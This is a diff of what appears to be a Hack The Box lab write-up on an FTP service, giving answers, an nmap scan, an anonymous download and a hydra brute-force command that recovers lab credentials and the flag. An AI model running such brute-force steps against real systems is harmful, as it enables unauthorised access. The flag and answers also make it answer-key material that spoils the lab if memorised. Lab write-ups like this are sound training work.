@@ -58,8 +58,8 @@ PORT   STATE  SERVICE
 1. What port is the FTP service running on? **Answer: 2121**
    - `$ nmap -sV 10.129.25.246`
 2. What username is available for the FTP server? **Answer: robin**
-   - `$ ftp 10.129.25.246 2121` → Login as anonymous and download the `users.list` and `passwords.list`
-   - `$ hydra -L users.list -P passwords.list -s 2121 ftp://10.129.25.246` → Bruteforce and retrieve a valid credentials `robin:7iz4rnckjsduza7` 
+   - `$ ftp 10.129.25.246 2121` → Login as anonymous and download the `users.list` and `pws.list`
+   - `$ hydra -L users.list -P pws.list -s 2121 ftp://10.129.25.246` → Bruteforce and retrieve a valid credentials `robin:7iz4rnckjsduza7` 
 3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer. **Answer: HTB{ATT4CK1NG_F7P_53RV1C3}**
    - `$ ftp robin@10.129.25.246 2121` → Login as robin with the retrieved password
    - `ftp> more flag.txt` → Read the flag
